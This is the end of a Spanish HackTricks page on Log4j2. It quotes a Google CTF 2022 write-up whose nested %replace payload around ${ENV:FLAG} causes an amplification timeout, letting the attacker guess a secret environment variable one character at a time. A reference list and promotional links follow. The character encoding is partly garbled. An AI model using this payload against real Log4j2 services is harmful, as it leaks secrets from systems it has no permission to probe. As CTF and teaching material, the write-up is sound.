En este [**writeup**](https://intrigus.org/research/2022/07/18/google-ctf-2022-log4j2-writeup/), en lugar de usar un ataque ReDoS, se utiliz칩 un **ataque de amplificaci칩n** para causar una diferencia de tiempo en la respuesta:

> ```
> /%replace{
> %replace{
> %replace{
> %replace{
> %replace{
> %replace{
> %replace{${ENV:FLAG}}{CTF\{" + flagGuess + ".*\}}{#############################}
> }{#}{######################################################}
> }{#}{######################################################}
> }{#}{######################################################}
> }{#}{######################################################}
> }{#}{######################################################}
> }{#}{######################################################}
> }{#}{######################################################}
> ```
>
> Si la bandera comienza con `flagGuess`, toda la bandera se reemplaza con 29 `#` (utilic칠 este car치cter porque probablemente no ser칤a parte de la bandera). **Cada uno de los 29 `#` resultantes se reemplaza entonces por 54 `#`**. Este proceso se repite **6 veces**, lo que lleva a un total de `29*54*54^6* =`` `` `**`96816014208`  `#`-s!**
>
> Reemplazar tantos `#` provocar치 el timeout de 10 segundos de la aplicaci칩n Flask, lo que a su vez resultar치 en el c칩digo de estado HTTP 500 que se enviar치 al usuario. (Si la bandera no comienza con `flagGuess`, recibiremos un c칩digo de estado que no es 500)

## Referencias

* [https://blog.cloudflare.com/inside-the-log4j2-vulnerability-cve-2021-44228/](https://blog.cloudflare.com/inside-the-log4j2-vulnerability-cve-2021-44228/)
* [https://www.bleepingcomputer.com/news/security/all-log4j-logback-bugs-we-know-so-far-and-why-you-must-ditch-215/](https://www.bleepingcomputer.com/news/security/all-log4j-logback-bugs-we-know-so-far-and-why-you-must-ditch-215/)
* [https://www.youtube.com/watch?v=XG14EstTgQ4](https://www.youtube.com/watch?v=XG14EstTgQ4)
* [https://tryhackme.com/room/solar](https://tryhackme.com/room/solar)
* [https://www.youtube.com/watch?v=Y8a5nB-vy78](https://www.youtube.com/watch?v=Y8a5nB-vy78)
* [https://www.blackhat.com/docs/us-16/materials/us-16-Munoz-A-Journey-From-JNDI-LDAP-Manipulation-To-RCE.pdf](https://www.blackhat.com/docs/us-16/materials/us-16-Munoz-A-Journey-From-JNDI-LDAP-Manipulation-To-RCE.pdf)
* [https://intrigus.org/research/2022/07/18/google-ctf-2022-log4j2-writeup/](https://intrigus.org/research/2022/07/18/google-ctf-2022-log4j2-writeup/)
* [https://sigflag.at/blog/2022/writeup-googlectf2022-log4j/](https://sigflag.at/blog/2022/writeup-googlectf2022-log4j/)

<figure><img src="/.gitbook/assets/image (675).png" alt=""><figcaption></figcaption></figure>

Encuentra vulnerabilidades que m치s importan para poder arreglarlas m치s r치pido. Intruder rastrea tu superficie de ataque, realiza escaneos proactivos de amenazas, encuentra problemas en todo tu stack tecnol칩gico, desde APIs hasta aplicaciones web y sistemas en la nube. [**Pru칠balo gratis**](https://www.intruder.io/?utm\_source=referral\&utm\_campaign=hacktricks) hoy.

{% embed url="https://www.intruder.io/?utm_campaign=hacktricks&utm_source=referral" %}


<details>

<summary><strong>Aprende hacking en AWS de cero a h칠roe con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Otras formas de apoyar a HackTricks:

* Si quieres ver a tu **empresa anunciada en HackTricks** o **descargar HackTricks en PDF** revisa los [**PLANES DE SUSCRIPCI칍N**](https://github.com/sponsors/carlospolop)!
* Consigue el [**merchandising oficial de PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubre [**La Familia PEASS**](https://opensea.io/collection/the-peass-family), nuestra colecci칩n de [**NFTs**](https://opensea.io/collection/the-peass-family) exclusivos
* **칔nete al** 游눫 [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **s칤gueme** en **Twitter** 游냕 [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Comparte tus trucos de hacking enviando PRs a los repositorios de GitHub** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
